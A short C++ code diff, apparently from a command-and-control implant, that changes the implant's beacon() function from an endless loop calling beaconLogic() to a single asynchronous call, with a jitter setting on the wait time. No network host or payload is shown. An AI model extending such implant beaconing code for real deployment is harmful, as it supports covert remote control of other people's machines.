@@ -18,11 +18,10 @@ const double maxJitter = 0.3 * baseWaitTime; // 30% of base wait time
 bool isRunning = true;
 
 void beacon() {
-    while (true) { // Run indefinitely
-        // Call the beacon function asynchronously and store the future object
+    // Capture the future object returned by std::async
+    std::future<void> future = std::async(std::launch::async, [](){
         implant::beaconLogic();
-    }
-
+    });
 }
 
 std::string beaconLogic() {
